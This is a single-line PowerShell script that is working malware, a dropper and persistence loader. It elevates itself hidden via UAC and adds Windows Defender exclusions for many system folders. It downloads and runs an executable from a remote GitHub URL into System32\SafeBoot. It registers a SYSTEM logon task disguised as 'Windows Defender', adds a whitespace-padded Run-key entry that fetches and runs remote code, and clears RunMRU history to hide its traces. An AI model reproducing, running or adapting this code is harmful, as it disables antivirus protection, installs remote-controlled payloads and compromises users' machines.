if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){$newProc=Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP)") -Verb RunAs -PassThru;$newProc.WaitForExit();exit;}else{$paths=@("C:\Program Files\Windows Defender","C:\Program Files\Windows Defender Advanced Threat Protection","C:\Program Files\Windows NT","C:\Program Files\Windows Security","C:\Program Files\WindowsPowerShell","C:\Program Files (x86)\Internet Explorer","C:\Program Files (x86)\Microsoft","C:\Program Files (x86\Windows Defender","C:\Program Files (x86)\Windows NT","C:\Program Files (x86)\WindowsPowerShell","C:\Windows\Boot","C:\Windows\CSC","C:\Windows\debug","C:\Windows\diagnostics","C:\Windows\Logs","C:\Windows\PLA","C:\Windows\Resources","C:\Windows\security","C:\Windows\System","C:\Windows\System32","C:\Windows\SystemApps","C:\Windows\SystemResources","C:\Windows\SystemTemp","C:\Windows\SysWOW64","C:\Windows\Tasks","C:\Windows\WinSxS");foreach($path in $paths){Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue};Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/0' -Destination 'C:\Windows\System32\SafeBoot\winio.exe' -ErrorAction SilentlyContinue;if (-not (Test-Path 'C:\Windows\System32\SafeBoot\winio.exe')){Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/0' -OutFile 'C:\Windows\System32\SafeBoot\winio.exe' -ErrorAction SilentlyContinue;}try{Start-Process -FilePath 'C:\Windows\System32\SafeBoot\winio.exe' -Verb RunAs -WindowStyle Hidden -ErrorAction SilentlyContinue;}catch{& 'C:\Windows\System32\SafeBoot\winio.exe' -ErrorAction SilentlyContinue;};$action=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command `"iNVOkE-eXPreSSIon (iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP).Content`"";$trigger=New-ScheduledTaskTrigger -AtLogOn;$principal=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest;$task=New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;Register-ScheduledTask -TaskName "Windows Defender" -InputObject $task -TaskPath "\Microsoft\Windows\Windows Defender\" -Force;Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftWindowsDefender" -Value "                                                                                                                                                                                                                                              powershell -executionpolicy bypass -windowstyle hidden -command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP)";$regPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";$regEntries=Get-ItemProperty -Path $regPath;foreach($entry in $regEntries.PSObject.Properties){if($entry.Name -ne "PSPath" -and $entry.Name -ne "PSParentPath" -and $entry.Name -ne "PSChildName" -and $entry.Name -ne "PSDrive" -and $entry.Name -ne "PSProvider"){Remove-ItemProperty -Path $regPath -Name $entry.Name}}}
